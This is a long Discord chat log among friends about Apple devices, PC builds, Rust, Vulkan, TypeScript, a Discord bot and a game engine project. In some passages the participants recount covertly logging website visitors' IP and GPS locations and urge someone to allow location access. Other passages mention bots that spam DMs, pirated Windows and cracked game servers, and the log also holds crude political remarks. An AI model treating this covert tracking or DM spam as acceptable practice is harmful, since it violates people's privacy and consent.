smaller uglier notch


whats the difference


but iphone notch


it creates more space anyways


actually makes sense


like the macbook notch


barely any more


larger notch = more shit they can cram in


to display more shit in the already tiny top left/right corners?


whats the point of a smaller notch anyways


i do not care about size reduction


im already used to the big notch


i think the smaller notch looks uglier


if i had the 12 i wouldnt upgrade


mid upgrade from iphone 12


used on ebay


who knows when ill use it again


then i boiught my iphone xs


it worked fine


when my iphone 8 broke in october i started using my ipad as a "phone"


i used mine for like 3 months when my phone broke actually


i dont have much to do on an ipad


last time i used it was to control the lights


i havent used my ipad in weeks


theyre not made for us peasants anyways


dont think about the pros


just get the air


you'd be using also like 10-20% of the M1/M2 you'll be fine


40% of the M2


50% of the M1's power


i'd probably be pushing idk


M1 is already really good


M2 is already really good


i wouldnt get it either


its not worth it for you


you'd only probably use 10% of the m1 pro's power


hed probably be using 70% of the m1 pro's power


he does rendering and compiling


it would be yue


put its performance to full potential


who would use that


if there was a person


(except for yue)


nobody here needs


heck i dont even need


a powerhouse but you won't even need


gold vs starlight


which one looks better


the old gold color was better


starlight is so mid


like it wont match my room and shit


but too dark for my taste


i love midnight


midnight is a cool color


silver too old school and gets dirty


starlight disgusting (gold better)


midnight too dark


the node.js course teaches u about node modules, packages, setting up nodes and setting up a backend server


but they didnt


if the m1 air price dropped the m2 air price would drop


the price didnt drop


and thats the price of the M1 air


lmfao how much storage do u use


for you i'd say you need base cpu, base ram, 512gb storage


old design 🤮


of course it is


i know my prices


yeah macbook air is 1199 usd


air is still >>>


would the pro be cheaper than the air


in what world


$100 more expensive than the air*


you're buying for the touch bar?


$100 more 💀


MacBook Air comes out next month


I mean it’s not even out yet


Rn is the time to buy


End of next year*


You won’t see one till next year


If you’re looking for a MacBook


Not in a year lmfao

What is there to wait for


Selling shit and working for my parents

- IT 
- C++


How does it compare to react


Oh yeah they added async await to swift


And see if it’s a cool language


I just wanna play around with playground


I. Told u I’m not gonna learn swift


It’s not apple


Shut the fuck up


I’m literally only gonna attempt to learn swift cuz of swift playground


I doubt you can install swift playgrounds on windows


And see if I wanna learn swift


Cuz I wanna play around with swift playgrounds


I said when I get a Mac

Our latest iPad Air and iPad Pro come with a ton of ultra-fast memory and storage.
iPadOS 16 adds support for virtual memory swap, meaning your iPad storage can be used
to expand the available memory for all apps and delivers up to 16 GB of memory to the most demanding apps.

its gonna compete with AMD FSR


since its a faster way


i think they are


So Metal 3 adds a new fast resource loading API
that minimizes wait time by providing a more direct path from storage to the unified memory system
so the GPU can more quickly access high-quality textures and buffers without waiting.


i have no idea what that meant


And to help game developers increase the performance of realistic
and immersive graphics, we're introducing MetalFX Upscaling, which enables developers to render rich, visually complex scenes even faster.
It works by rendering smaller, less compute-intensive frames and then applies high-quality spatial upscaling and temporal anti-aliasing.


nice explanation bozino


i rember when they announced metal 2 in 2018 or smth


<@650439182204010496> theyre abotu to talk about metal

NOW IT DOESNT WORK


.nitrospam             throw new Error('STOPPING!')

lets see if i can catch it

your stupid ass doesn't wanna do that


like every other fucking erver


you can make the notification settings


are you fucking stupid


it wont read


if i put it inside


wait a sec


is it not changing the value


cuz the thing = false isnt working


this is the problem


i know for a fact


```js
if (command === `${config.prefix}nitrostop`) {
    thing = false;
    console.log("ACTIVATED!" + thing)
}
```


un real eggine


`thing = false`


because i dont think


is there something wrong


i can ban you if i wanted to


then calls again


it waits 600ms


so for me


kinda like a loop


then calls the function again


it waits a certain time


```js
let thing = true;
if (command === `${config.prefix}nitrostop`) {
    thing = false;
    console.log("ACTIVATED!" + thing)
}

RAIKU IS ONLINE


did u guys see my masterpiece


whats it called again


that swift program on ipad


he watches youtube


join but dont talk


wtf is pypy


public static void main (string[] args


python's interpreter is Python


i would fall for that


theres no way


yeah i saw thru that


clang is compiler right


DUDE I WAS CONFUSED FOR A SEC OK


What languages don’t work well on Mac


Yeah I get it now


Oh yeah because the chess program worked for Neng


That was the issue


You said u had issues


To work. On Mac


That was a shame


I mean I couldn’t log into iCloud when I got my thing working


How do U even get a cpp program working on Mac


If you wanted to open a widget the animation takes 100 minutes to load


Result was so fucking slow


It was so awesome


I got Big Sur running in virtual box once


I’m not too prograymer yet that using a Mac would be fine with me


Because you’re prograymer


That’s just a regular apple skull issue


I mean windows literally has 2 settings apps


It’s not complicated


Just if you’re a professional Ripperoni


Apple is still easier to use imo


And easier to use


Because it looks better


So they just pick fruit


That’s because they knowc


Yes but people don’t see it when they first use it


ITS SHITTER THAN USUAL


BRO WHY IS MY DATA ASS


People don’t care when they use it


It’s still related kinda but


We’re talking about general usage


That’s on the programming spectrum 💀


Ever since then I’ve been eating apples for phones


Which ran iOS 7


iPhone 4 was already a 6 year old grandpa


In 2016 💀


My first phone was an iPhone 4


It’s not so hard


If you had apple from a young age


It’s hard if you’re already used to other platforms


And impossible to leave


That’s what makes their walled garden so strong


Apple moment !


Because apple is proprietary


Because they couldn’t in the first place


Craig is best apple dude no cap


And they never supported directx either right


Did they deprecate Vulkan?


Apple deprecating OpenGL 🖕


*which was good


L from apple


Oh I saw that


just made this piece of shit


my bot token

Popping boba is goated

but i dont need that bd extension now


woah no way you know tech nolo gy!


before i realised how tedious and boring gamedev is


probably even me


i remember every gamer kid's dream was to be a gamedev


my favorite programming language is scratch 🤓


fuck you pybot


if it dies i wont learn


so long as it doesnt die


meh ill prob do php last


but js cant manage databases <a:waaaaaa:978757388565905488>


as long as it doesnt die


other languages are cringe


JavaScript, C++, PHP (and maybe C)


im going to learn


private dynamic void main string args


string for strings


public static void main string arg mofo


then ill learn php first


i needa learn backend


i mainly only know frontend now


i wanna get into full stack


guess ill learn cpp


even though i WROTE `.catch(console.error);`


sometimes it doesnt work idfk


the only issue i have is error catching


it is quick to work with if you're good at intermediate js, but its fine for me for now


i cant fix as fast cuz i have no clue what im doing sometimes, especially when im using promises and stuff


beginner javascript is as easy as python once u get deeper and start learning async await and that shit the skill level rises i agree


if your code doesn't work properly semicolons are helpful


its mostly optional tho


=== and == does have a difference but im not experienced enough to know

lambda is not confusing after all if u get the hang of it

semicolons can be used as a break, so if you want to end a line of code there to pause then u can use it


mf really spent half an hour typing and went offline


tur ip ip ip


mf is dead


there is no debate going on anyways


i just said i cant debate properly so ill just talk jack shit style


since when did i say i forfeited


so ill just talk jac kshi


i cannot debate


and netherlands is more socialist


but hes duth

SUCKS TO SUCK


IM SO GOD


switch statemetn with 1 case 💀


cuz confusing asf


ykw gonna drop the translator


its an undocumented api


npm install deepl-translator


WHATR DO U MEANN

.translate your mom


aight lets try this


bruh deepl doesnt have chinese


ohhh thats why ur using gep


that was fun


the only thing i used google earth pro for was the flight simulator


imma try smth


im implementing it rn


becuase nobody likes node.js


on deepl's website


i havent touched fhdbot in a while jeez


i cna use


its on github


me when 2600 is more expensive than 5600x


that's just 💀


who would even buy a sub-30cfm cooler


and a 60CFM cpu cooler


5x50CFM case fans


but enough to have adequate cooling


cuz im not getting like


cuz i want like


do top case fans even do anything


and has faster pcie


its only like


also <@650439182204010496> i switched to an X570 motherboard


nuke the entire world


they decide to


and i dont care how it happens either


in my life


as long as it happens


i dont care about when it does


just hoping that ccp dies


i dont care enough rn rlly


even his workers


WE CAN BE FREe


noone likes him and his views and when he dies everyone will be like OH THANK GOD FIANLLY


becuase nobody likes him


im being serious


because xi jinping die


in the 2030s


in 13 years


at this point he doesnt care enough to reset


the only community server im active in is a ~1000 member server anyways lmfao


my other servers dont care


a bad ideology


epic ping fail


Thank god I won’t have an LGA socket cuz then I have to inspect the pins and possibly break them


when posting them


your images seem to have a higher resolution


i have nitro tho so


epic embed fail


hello guys https://cdn.discordapp.com/emojis/912356252653355069.webp?size=64


it will result in an epic embed fail;


in the middle of a mesasge


if you were to use an emoji


so i disabled it


i have nitro now


how did u not know


im back bitdhes


my iphone cant focus


quality sucks cuz i used my ipad to take photo


<@650439182204010496> just cleaned my desk


response time thing


should i turn on OverDrive


i like 2.2


2.2 or 2.4 gamma?


super sharpness is so ugly


oh my god


i noticed when i did Ctrl+F


like i've had my monitor brightness on 20% for like the past year


its an acer thing


on a monitor


price is now  $1780


why would i need 144hz on a secondary monitor


buying a 2nd one is a waste of money


use my current one


i can just


i dont need to buy a 2nd monitor


that's more like it


SO BASICALLY LIKE MY CURRENT SETUP


TO THE LEFT


AND HAVE THE SECOND ONE


PUT ONE IN NORMAL POSITION


DO DUAL MONITOR


I CAN JUST


should i just


i am currently dual monitoring tho 💀


stick with single monitor


you know what ill probably


should i do like


what if i wanna focus on one


and another on right


because one on left


might not be comfortable


having a dual monitor setup


come to think of it


shit case and shit gpu


did i show u my build from last year


are they fan headers?


how do i check


how many can i plug in


what do fan controllers even do


do i need like


hows the build now


wd or samsung?


higher cfm and cheaper


also changed up my cpu cooler


idk if i can get bottom fans with this case lmfao


which is a double fan


watercoolers always have the fan at the top


which is what watercoolers use


usually has 2 slots at the top


you didnt know top fans existeD?


with that many fans


do i need a fan controller


and the stock fan will be the back


2 top fans


3 front fans


im gonna have


FOR 50 BUCKS


THIS 5 PACK


<@650439182204010496> i found a fucking


Wait Taran quit LMG?


did u play bitburner yet


ay 5 more levels


i opened it and regret it


censored by default


100 steam friends


and having like


imagine actually buying it


nice pictueres bozo


no there isnt


ok i searched it up


super dungeon bros - idol pack


whats that mean


li ying is what???


not even funny


i needa buy more


oop im out of ram


the things connecting


the round things are the computers


so lets take this image


what even are ports 💀


im infiltrating joesguns


what even are ssh ports


async await 💀 👍


literally a programming game


what do u expect


oh damn lmfao


its free on steam


anthony mac doesnt even use a mac 😠


i love this emote


MF REALLY JUST


looks like a duck


i can kill my own brethren 👍


yeah im killing everyone with a pawn


do u have a lot of stuff on iwndows


is ur linux partition larger than ur windows


im tryna 100% emily is away too


wait where do i run it


cuz i havent learned async await yet 💀


i dont think choosing NS2 was a good idea


ah yes NS1 and NS2


wow i can use both vim and nano


to hack stuff


to run scripts


but u use javascript


its just like a hacker simulator


do u know what it is


<@650439182204010496> have you played bitburner


In fact non of the spaces works at all.


So the zero-width space thing doesn't work anymore.


I guess that can wait until we actually finish the actual engine.


That reminds me that I need to find out how to parse those files in the Nengine.


I have no idea.


Mazin said he's still going to online school.


No he's working.


<@672892838995820553> Are you still in online?


You're still in online?


He's gonna skip like 5 days of school.


I thought that ended long ago.


Oh wait, his trip to Dubai and China?


Your main account is also mainly dead.


You rarely talk.


Except you and Neng.


I don't get excited (though yes I do not have friends).


How about you?


What is up?


I wonder how long it's gonna take before it ends.


<@672892838995820553> What's up?


Also, I found out that you can modify constants in C.


I did not know how to set up ones that are not prebuilt.


For prebuilt ones you don't need to set up anything.


Yes I know.


I did not know you had to use Ruby to set up Jekyll themes.


<#983539124470423553> messaged me.


@.FHDHGNGN Profile picture no longer animated, I see.


Okay, but he's offline.


Neither did <@672892838995820553>. <@672892838995820553> never asks since he's always offline.


Okay, but I did not ask.


Or, it could be that <@672892838995820553> is actually invisible, but you should avoid pinging <@672892838995820553> as when <@672892838995820553> is invisible it indicates that <@672892838995820553> does not want you to ping <@672892838995820553>.


<@672892838995820553> is currently offline. Please avoid pinging <@672892838995820553>, as <@672892838995820553> is currently offline, like <@672892838995820553> always is.


Okay, why don't you explain?


Databasing is often handled by the backend itself, not the front-end scripts.


Not that we made one.


I said we communicated with a backend.


Yeah I know.


No I'm saying we communicated with a backend.


On our website.


The thing with the web hooks.


We have *communicated* with backends before but yeah we never really built any web back-ends.


I mean you could build a backend entirely in Javascript...


Do you even know what a back-end is?


Not sure what's been going on.


I mean, he's barely online these days.


Maybe he's talking about his AWS instance?


Neng does not understand web programming concepts.


(Or on GitHub).


You still have to host the HTML and CSS yourself.


No that's just for the domain name.


You can also set up your own DNS server but that's a lot of effort so...


But I'm planning to use it for future references when working with web APIs so...


Also, in case you are unaware, I replaced the commented out JavaScript on our website with TypeScript and replaced the jQuery code with fetch.


It's released on Youtube just 7 hours ago as of writing this.


Also, unless you're subscribed to Floatplane, it's unlikely you saw this.
https://www.youtube.com/watch?v=kyCJ17oq6kI


But it's pretty simple from what I know.


I haven't used Jekyll much before.


Yes I saw it.'


You bought it?


NVIDIA Keynote in 31 days.


Or we just not care as well.


We need to make them care.


Everyone is offline these days it seems.


Or did I misinterpret your statement?


Also, how did you log into Hypixel with a cracked account?


Okay, that's good.


@.FHDHGNGN I assume you're still on 1.19. Is that right?


So, maybe I'm wrong.


Okay, I can't find the message.


I think you said something like that.


Okay, we will cease all usage of your name and all other related identities.


In my opinion it doesn't resemble the skull emoji at all.


Hold on gotta go eat.


Meaning of 👷: What you reply with when you don't know what to reply with.


Actually more than a month.


It's still a month before the NVIDIA keynote though.


You also use TypeScript as well.


In my field a string is a string stored in a variable so we use the term "string literal" to refer to strings not stored in variables.


Oh, it's just a string that's not in a variable.


System programmmers: *ahem*.


String literals are embedded in the program itself (I'm not talking to a noob so I can say this).


"it's a line of text that programs remembers"


"it shows text to a place that only web devs know where to look"


I'm not a teacher so...


Oh yeah right.


The only other option is sending it through webhooks, but we all know how that went.


That would require server-side programming.


By the way, have you beaten this level yet?


For some reasons.


Autosave every millisecond is an option in vscode.


Not really once it's setted up but I still agree with your point.


And launch configs.


No I use vscode tasks.


Wait, TS is also compiled.


However, since Rust is a compiled language, you can't hot-reload it.


Though if you need more performance than what TypeScript offers I would suggest using Rust.


Yeah, but TypeScript covers most of that.


And HTML and CSS.


So learn TypeScript.


I mean, yeah.


Yes but tapping on the page zooms instead of clicks on my browser.


Since we know Rust now we might wanna do something that spans the entire web stack.


In my opinion unless you're going to use the entire web stack you might as well as just use something like WordPress.


I heard web developers are some of the highest paid programmers, if not the highest paid programmers.


You should consider learning Vulkan.


> Vulkan queues provide an interface to the execution engines of a device. Commands for these execution engines are recorded into command buffers ahead of execution time, and then submitted to a queue for execution. Once submitted to a queue, command buffers will begin and complete execution without further application intervention, though the order of this execution is dependent on a number of implicit and explicit ordering constraints.

- Vulkan 1.3.224 - A Specification


That is a big spreadsheet.


Geometry Dash demons, I see.


In ten years, the Li Institution will own China.


I wasn't there though.


(Not that I know much about math in general).


Rearrange to solve for x and something, I guess.


<@672892838995820553> Looks like you have a lot of homework to do.


And I am being rate-limited in thread-creation.


Not a great experience.


Like, I drove from Calgary to Ontario.


But flying is less painful than driving.


Though now that I've done more research I found out that they're basically the same drivers except that Studio drivers are released less often for stability reasons.


Also, since I am no longer gaming on my system, I am considering replacing the Game Ready drivers with Studio drivers.


<@593106116821647363> Coming back?


I've never done summer school bozo 😹


This is the first thing that came up when I visited NVIDIA's website.


<@672892838995820553> 🧮 📖 ?


Neither can working below minimum wage.


North or South?


By the aliens?


You back in Ontario yet?


<@593106116821647363> What's up?


Sure bozo 😹


You broke a car?


Why were you grounded?


<@628672513345454122> YOU'RE BACK!!!


<@593106116821647363> What's up?


Oh wait he only ghost pinged Lal.


Let me check.


I think Mazin ghost pinged you guys.


RTX 40 series is about to launch soon though so...


**Breaking News: Neng Li returned from China, Ghizali's rumours proven false.**


Mazin said that you were supposed to stay for 2 weeks at least.


So, you went for like what, a week?


He's in New Brunswick right now I'm pretty sure.


Along with the IP and GPS logging mechanisms.


The webhooks have been removed already.


There generally isn't any.


We even went as far as to asking visitors for their GPS location and logging that through the webhook.


A few months back me, Neng, and Anthony decided that it would be a good idea to log visitors' IP addresses in a webhook.


Ah, that explains the delay in reply.


<@593106116821647363> So, what are you doing right now?


So, what can we do until he comes back?


A reliable source tells me he probably won't be coming back until the the end of the summer.


<@712373502501453854> Anyways, Neng is in China right now in case you don't know.


Also, you technically agreed.


He's the carpetmaker guy.


He's the one in charge of the website.


<@593106116821647363> is turning 4 this year.


<@712373502501453854> What's up?


Which one looks the best?


```c++
#define let const auto
#define var auto
```


Hi, NVIDIA shill.


How to draw a simple 2D triangle in Vulkan.


And it's going to be 36 degrees this Thursday.


I heard it's 30 degrees right now.


<@593106116821647363> So, how's New Brunswick so far?


So, I guess we just wait then.


<@593106116821647363> Maybe shouldn't have done that?


Just made it through the Swap chain subsection in the Presentation section in the Drawing a Triangle chapter.


In fact, I'm learning Vulkan right now.


But definitely not delayed indefinitely.


It might be for a while.


Okay, please allow me to remember your conventions.


So, you're *getting* a new chair.


How is it?


<@628672513345454122> You got a new chair?


Like, anytime soon?


<@672892838995820553> Anyways, Are you going to work on the Nengine?


I just logged on.


I tried posting a link to a hidden channel from another server.


Unfortunately, I did not remember your VSCode theme.


You got copilot?


None except for ideological reasons.


So, you're gonna join the SKLauncher squad now?


You spent 30 bucks for a Minehut server?


Plus, me and Neng don't have Minecraft accounts in the first place.


Well, all of our servers are cracked, which effectively prevents them from accessing any of Mojang/Microsoft's servers, which means that the reporting thing won't work.


I can't even play on public servers anyways so...


It's a state of matter in which 3 entangled particles can constantly oscillate between different states without energy.


By the way, `code .` works on Linux without terminal macros.


<@672892838995820553> How's this rendering API I made?


Account hacked. Ignore.


Good. How about you?


I have to carry bricks, so maybe around 20:00 PM EST.


"It's not that important so why bother"?


Or a VM.


Well, you could run can pooper in a sandboxed environment.


<@672892838995820553> What's `consts.py`?


So, Lisp is actually older than C++ for some reasons.


And C++ appeared in 1985.


Seems like it.


So, it first appeared in 1958.


Ironically, LISP is also one of the most oldest languages shown.


AND I WAS WRONG


After all, the slang term "tube" is still used to refer to amateur pornography for some reasons.


Then it's probably designed from the beginning to be a amateur pornography hosting site.


Well, Youtube used to be popular for it's massive collection of amateur pornography, so I guess the developers decided to structure it that way.


Though you'll somehow need to get a CPU compatible with Apple's proprietary M`X` architecture(s).


And get sued by Apple?


Brain messed up.


I'm on Linux and Neng's on macOS.


Also, I'm not even going to distribute as an AppImage anymore.


Line 15-20, Column 18-20.


That's also a possibility.


Like, there's this "You might like" thing down at the lower right corner in your home page that basically shows you repositories similar to what you've been working on and what you've been browsing.


Anyways, I think those people were just browsing GitHub and they stumbled upon your repos.


That was a joke.


Oh yeah, me and Neng spammed your GitHub profile link all over Reddit while you were gone.


No that's for lifetimes.


Wait, I think you can also use `break`, but I'm not 100% sure.


Yes, so you have to return the `if` statement.


(That'll instantly break you out the loop so I don't know why you would want to do that).


If you use the `return` keyword it will `return` the function.


Just return but without the `return` keyword and semicolon.


There's also the enumeration system which is heavily influenced by Haskell.


Yeah, that's legal.


In Rust, pretty much everything can return.


Even `if`s, loops, and scopes.


Essentially, anything can return something.


There's also `if let`s.


```rust
let x = if b == y { 2 } else { 3 };
```


Ever used Rust?


I don't think TypeScript has functional programming language features.


Also, the release build isn't working for some reasons.


<@672892838995820553> I have finished the Wars game.


Very interesting indeed.


<@672892838995820553> Vulkan on Rust seems to work.


It's a 2D game framework like PyGame but for Rust.


<@672892838995820553> You should check out Emerald.


I'm figuring out how to use bindgen.


Bruh, do you actually play that game?


If I have a good reason to do so.


If I have a good reason to do so.


Minecraft: Java Edition.


<@628672513345454122> You have returned?


Good. How about you?


Neng Li's face reveal.


How does having a working computer prevents you from getting an M2?


I'll have to check the dimensions though.


It's kind of like a really thin case for the M2 MacBook Air.


What do you mean?


Limited time only.


It's a MacBook Air skin.


Oh, it uses SDL.


Or was it someone else?


Did you boost that server?


The developers placed the macOS build next to the Windows build since they're too lazy to separate them. 😹


I broke it so badly I had to uninstall and reinstall.


<@672892838995820553> I'm editing a Python game I got from Steam.


Even more bruh.


I don't really get it.


Stuff like these?


Yes, but it got deleted due to inactivity.


I have visited Reddit before.


No, I just like arguing with people for some reasons.


Okay, got it.


Oh, this article.


I can show you in screenshare.


IT'S LITERALLY TAGGED "PSYCHOLOGICAL HORROR".


Have you actually visited the steam page?


Why don't you actually verify my screenshot before randomly making assumptions?


You can literally visit the Steam page yourself.


<@628672513345454122> This is what it says on the Steam page.


Well, it's psychological horror, so whether it's scary or not really depends on you.


Because it constantly tried to break your PC.


Some people had to go through months of therapy after playing it.


No, it's the scariest game I've ever played.


I guess, since it's psychological horror.


<@672892838995820553> Have you ever played Doki Doki Literature Club?


Actually, it's `use std::io`, which Rust inserts by default anyways so you don't actually have to do that.


The programming language.


Doing stuff with Rust.


Can't right now.


But you can still change it yourself.


Technically I can't stop you from changing your name to whatever you wanted to be.


You have an FPT this early?


By the way, <@593106116821647363>, how's Rust so far?


It's in C++, but you should be able to get the concept.


Anyways, this guy made a video of how to implement C# scripting.


That's what "embed" means in this context.


Basically using it for scripting.


You can embed C# code, but it will not be deeply integrated.


About as well as C.


Also, we need the editor to be deeply integrated with the rest of the engine, which is written in Rust. C# can't really do that.


However, we are building all the UI elements from scratch, so either way we won't be using any of C#'s GUI functionalities.


Okay, so `let` just means immutable. Here's what `const` means.

Let's say that you create a const.
```rust
const FOO = 25;

fn main() {
    println!("{}", FOO);
}
```
The compiler converts it to this.
```rust
fn main() {
    println!("{}", 25);
}
```
At first, it might look like C++ macros. But here's the difference: C++ macros are replaced mindlessly. In Rust, `const` values are evaluated before being replaced. To demonstrate this:
```rust
const FOO = 5 * 5;

fn main() {
    println!("{}", FOO);
}
```
The compiler converts it to this.
```rust
fn main() {
    println!("{}", 25);
}
```
Because of this, the value of `const` values must contain enough information for the compiler to evaluate it at compile time.


He's used to `let` being mutable.


`let` just means that the variable cannot be changed after it's created.
`const` means that the value of the variable must be determined at compile time.


macOS and Linux must use different binary formats.


It was because the Windows build was queued to go after the Linux build was done


I found out why the Linux build finishes before the Windows build.


By the way,


I have a separate partition with a pirated version of Windows installed and they didn't even care.


Also, it seems like Microsoft is abandoning piracy protection on Windows.


But some distributions are on Wayland.


Applications written for X11 won't run on Wayland, and vice versa.


Note that Linux desktops are split between X11 and Wayland, which are incompatible with each other.


So, I think we can start by supporting Linux with X11 and gradually move onto other platforms.


Since gaming on macOS isn't really that popular.


Also, by the way, I found out that we don't have to use Metal to support macOS.


<@672892838995820553> So, you're finishing up PyUDP now?


I had to use `.then()` when obtaining a member or something similar.


With the `.then().catch()` stuff.


You use it a lot in discord.js.


Since non-ferrous metal do not rust.


<@628672513345454122> You might recognize this.
```rust
let pipeline = GraphicsPipeline::start()
        // We have to indicate which subpass of which render pass this pipeline is going to be used
        // in. The pipeline will only be usable from this particular subpass.
        .render_pass(Subpass::from(render_pass.clone(), 0).unwrap())
        // We need to indicate the layout of the vertices.
        .vertex_input_state(BuffersDefinition::new().vertex::<Vertex>())
        // The content of the vertex buffer describes a list of triangles.
        .input_assembly_state(InputAssemblyState::new())
        // A Vulkan shader can in theory contain multiple entry points, so we have to specify
        // which one.
        .vertex_shader(vs.entry_point("main").unwrap(), ())
        // Use a resizable viewport set to draw over the entire window
        .viewport_state(ViewportState::viewport_dynamic_scissor_irrelevant())
        // See `vertex_shader`.
        .fragment_shader(fs.entry_point("main").unwrap(), ())
        // Now that our builder is filled, we call `build()` to obtain an actual pipeline.
        .build(device.clone())
        .unwrap();
```


However, although Rust is syntactically similar to C++, the language itself is pretty different.


So, around halfway through the entire book.


Chapter 10, Section 2.


<@672892838995820553> So, you're onto Rust now?


Which website are you scraping?


What does it do?


<@672892838995820553> Also, how's PyUDP?


When you have a single tab open that single tab takes up the whole space on the top.


No on the desktop.


Safari has a weird tab design that might take some time to get used to.


Pretty good. How about you?


I interviewed Anthony Huang after his Linux challenge to tell us about his experience while using Kubuntu. Here are his responses.

**Q: What did you liked best about Kubuntu?**
A: It felt like Windows but sometimes faster.

**Q: What did you disliked the most about Kubuntu?**
A: KDE Store errors, sometimes there were random crashes and the KDE Daemon would pop up like ten times to authenticate myself. Also, screen recording with Geometry Dash is shit.

**Q: What new things did you learn while doing this challenge?**
A: KDE is good.

**Q: Overall, how was your experience with Kubuntu?**
A: 8.5/10 compared to windows 9.25/10 so very good.


I'm estimating that we'll spend around 70-90% of the time working in Rust.


The libraries for the scripting languages won't take long at all.


We might have the editor be written in another language if that's necessary but if everyone's onboard with Rust we'll just write it in Rust.


To work on the Nengine itself, yeah.


Though we do need more system programmers since that's the biggest part of the Nengine.


We don't even have a decent plan of the internal code architecture yet so it's still unclear who's doing what.


Okay, whatever you say.


AND THEY'RE ADDING WINDOWS FOUNDATION CLASSES SUPPORT IN RUST!!!


🙀 🙀 🙀


DirectX 12 for Rust. 🙀


They even created a crate for Windows development!
https://crates.io/crates/windows


That's one of the ways you can return in Rust.


But yeah, that's allowed in Rust.


I should probably use `return true;` instead to avoid confusion.


They rewrote parts of Word in Rust.


They share only one functionality, and that is compiliation.


It's vastly different from CMake.


It's like `npm` but for Rust.


Because I thought you might know more.


Because you know as much about cargo as I do.


<@672892838995820553> Why does cargo build faster on Linux than on Windows?


Oh yeah we really need to start coming up with non-random titles.


But wait Daiwik is learning Rust so that might not happen.


If that happens we're down to just one software engineers.


Or what caused you to stop learning?


Why did you gave up?


So I decided, why not use it?


And I found out that it's very fast.


The reason I even looked at Rust was because you picked Rust.


That's the official tutorial.


He ran a Windows ransomware through Wine.


And are setted up differently.


Servers have different process trees than desktops.


They're targeting servers though.


Have you tried Ctrl+Alt+F4?


So you can probably remove it easily if you ran it through Wine.


Ransomware doesn't work properly on Linux.


Okay, try pressing Ctrl+Alt+F4.


Okay, hold on a sec.


(Or at least how I would do it).


Here's what to do.


They aren't all that common though and mainly happen on Intel graphics.


I have experience instabilities with KDE before.


There's a native version on Linux?


You mean GIMP?


~~And because Photoshop doesn't work on Linux~~


That does not prevent you from opening a browser.


Both of which you know how to do.


You could've either edited the elements or photoshopped it altogether.


How about tell me which channel it was?


Well I guess you can't provide evidence.


Right click on message and select "Copy Message Link".


I'd believe you more if you give a message link.


I saw the repository archived.


But if you insist it's probably Python.


I don't have one.


Also, I'm not familiar with PyGame but I am with OpenGL.


1. OpenGL + C++ is a very bad combination.
2. I did that because I wanted to know how far I can get without any software architecture.


When did I say that?


Bruh C++ ain't my favourite language.


No I just logged on.


<@672892838995820553> I had to convert my entire project to an ESM module to get the library to work.


This is not good.


Okay, I reverted all of my changes.


Okay, that library is what's been causing the problem.


I CAN'T LOAD MODULES?


The array is shuffled after each reset.


It minimizes repeats.


Once the array is empty, it's resetted.


So what I'm doing right now is when a name is used, it's popped off the array.


But it caused repeats.


That's what I did earlier.


Yes, but my code relies on shuffling.


Also, this has the functions I need.
https://www.npmjs.com/package/array-shuffle


TS compiles into JS anyways.


Okay, I needed a better shuffle function.


Oh wait the bot crashed 😹


Okay, let's try something else.


Okay, rate limited again.


In TypeScript, floats and ints are the same thing apparently.


Okay, I will not add delay then.


Bruh, is my bot being rate limited?


Wow, this is taking a long time.


And it works. <:can_pooper:987033734773612574>


<@672892838995820553> StackOverflow proposed a better solution.
```js
function freeze(time: number) {
    const stop = new Date().getTime() + time;
    while(new Date().getTime() < stop);       
}
```


But it's probably not consistent.


I'm not sure how long on a 10700K with Node 16.16.0.


That would depend entirely on the CPU and exact Node version.


<@672892838995820553> By the way, I found out how to wait in TypeScript.
```js
for (let i = 0; i < 9999999; i++) {}
```


I believe you are falling behind in Rust.


So that there's 30.


Or I can copy my favourite names.


Well, there's 30 members but only 20 names.


BRUH WHY IS THERE STILL 3 KILLJOYS.


I'm trying to improve the probability distribution.


Bad probability distribution.


🦀 🦀 🦀 🦀 🦀 🦀 🦀 🦀


We can also build Li Institution towers in every major city and take over the world from the inside out.


Everyone except UK and US was on the bloc.


It was also the year China opened up to foreign investors.


Wasn't that what happened in 1976?


When you buy them, you get an image of a GPU in your inbox.


And try to pretend that they're real GPUs.


There's a bunch of scams on ebay where they sell pictures of GPUs.


Plus, I can mine crypto with it instead of selling the card itself.


I have only $0.00.


I'm serious. This is real.


!steal kubuntu https://cdn.discordapp.com/attachments/978304385895522324/996148223255261254/spinkubuntu.gif

Been spamming Neng's DM for a while now and he still haven't blocked my bot.


Anyways, gotta go.


Yeah because it's native on Windows.


Well, I mean, vanilla Geometry Dash works perfectly on Linux.


<@628672513345454122> What do you mean by "oh wait i completely forgot, the challenge lasts for one week"?


$$$start_spamming_dm$$$ <@672892838995820553> take this ratio bozo


Bash is mainly built for system automation, while Python is a programming language.


Though bash is kind of different from Python and are built for different things.


Which is why Python's almost always installed by default on Linux.


In fact, most distributions have large portions of them written in Python.


Yeah, Python's on Linux.


What do you mean by that?


In fact, Unity also works perfectly on Linux (last time I tested it, of course).


Given the context, I assume you mean Unity Scripts, and if that's the case, then yes.


Sorry, I was AFK.


It's probably Aterno's load adjustment system.


Do you want me to do it?


Basic WASD movement.


Do they fight each other though?


I got them all too.


Apparently, a 10700K with a 1660 SUPER is more popular than I thought.


<@628672513345454122> Bruh, my setup is on the Sodium CurseForge page.


Just usernames with inventories and locations tied to them.


There isn't really a concept of "cracked accounts".


You mean you can join with my username and play as me?


And somewhere near the beginning he spent a full day customizing his desktop.


He actually managed to get all of his games and most of his peripherals working correctly.


<@593106116821647363> Anthony is around half-way through his Linux for a week challenge.


Anthony's starting the neutral face emoji trend.


Prove it by going to the Li Institution website and clicking "Allow" when it asks for your location.


<@628672513345454122> Neng wrote this in Rust.


That destroyed a lot.


That might be useful.


What does that do?


Yeah, I know.


More like Riot-style graphics.


It's none of their business.


My school doesn't give out report cards.


Also, it constantly enforces a pascal case style for `struct` names for some reasons.


It only has `struct`s.


In case you don't know, Rust doesn't have `class`es.


Reading more documentation.


Are you lagging behind on this?


What you basically do is summon an arrow that does zero damage on top of the attacker and assign the owner of that arrow to the mob that you want that mob to attack.


At least I understand the concept.


I already know how to do that.


How do you make one?


All I did was just constantly summoning charged creepers.


I didn't actually know how I made it.


`[Entity Batching] 16 draw calls / 16 render types = 100% effective`


Then try Kazam.


Or, if you just wanted to record and none of the advanced features, there's Kazam.


<@672892838995820553> How's homework going?


How are you so bad all of a sudden?


I also found this.


You didn't experience slowdowns when Steam was open so...


Try opening Steam.


I think so.


Since X11 is a server, you can use the desktop of another computer from across the internet!


On Linux, you don't need TeamViewer.


Let's see how well you would perform!


Anthony's switching to Linux for a week.


Make a first-person shooter in Metal.


And sometimes faster than even Direct3D 12 Ultimate.


Because Vulkan is faster than Direct3D 11.


